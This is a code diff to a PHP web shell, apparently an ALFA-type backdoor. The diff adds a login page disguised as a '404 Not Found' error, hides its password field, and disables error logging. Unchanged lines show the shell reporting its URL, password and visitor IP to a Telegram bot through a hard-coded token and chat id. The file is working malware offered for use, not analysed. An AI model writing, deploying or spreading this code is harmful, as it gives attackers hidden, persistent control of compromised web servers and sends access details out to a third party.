@@ -1,4 +1,123 @@
 <?php
+session_start();
+@set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+
+/* konfigurasi */
+$password = "ad0c41f0f3d5ff786172871170ec5916"; //mrmad
+$default_action = "FilesMan";
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+date_default_timezone_set("Asia/Jakarta");
+function login_shell()
+{
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>404 Not Found</title>
+    <meta name="robots" content="noindex,nofollow">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            width: 100%;
+            height: 100%;
+        }
+
+        body {
+            font-family: sans-serif;
+        }
+
+        form {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            z-index: 9999;
+        }
+
+        input[type=password] {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: black;
+            caret-color: black;
+            font-size: 14px;
+            width: 120px;
+            height: 20px;
+            opacity: 1;
+        }
+
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            border: none;
+            width: 100%;
+            height: 100%;
+        }
+
+        #hiddenWrap {
+            visibility: hidden;
+            position: absolute;
+            left: -9999px;
+        }
+    </style>
+</head>
+<body>
+    <div id="hiddenWrap">
+        <form method="post" id="loginForm">
+            <input type="password" name="pass" id="passInput" autocomplete="off">
+            <input type="submit" name="watching" value="submit" style="display:none;">
+        </form>
+    </div>
+
+    <iframe src="//<?php echo $_SERVER['SERVER_NAME']; ?>/404" 
+        id="iframe_id" 
+        onload="document.title=this.contentDocument ? this.contentDocument.title : this.contentWindow.document.title;">
+    </iframe>
+
+    <script>
+        window.onload = () => {
+            const wrap = document.getElementById('hiddenWrap');
+            document.body.appendChild(wrap.firstElementChild);
+            wrap.remove();
+
+            const input = document.getElementById('passInput');
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    document.getElementById('loginForm').submit();
+                }
+            });
+        };
+    </script>
+</body>
+</html>
+
+<?php
+    exit;
+}
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    } else {
+        login_shell();
+    }
+}
+
+?>
+
+<?php
+?>
+<?php
 @error_reporting(E_ALL ^ E_NOTICE);
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
@@ -25,7 +144,7 @@ $botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
 $chatId = "8478623770";
 $xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
 $logMessage =
-    "___APACHE TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD \n\n IP Hacker  :\n [ " .
+    "___ALFAKEM___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD \n\n IP Hacker  :\n [ " .
     $_SERVER["REMOTE_ADDR"] .
     " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
@@ -4953,4 +5072,5 @@ $_POST['a'] = 'FilesMan2';
 if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
 call_user_func('alfa' . $_POST['a']);
 exit;
+
 ?>
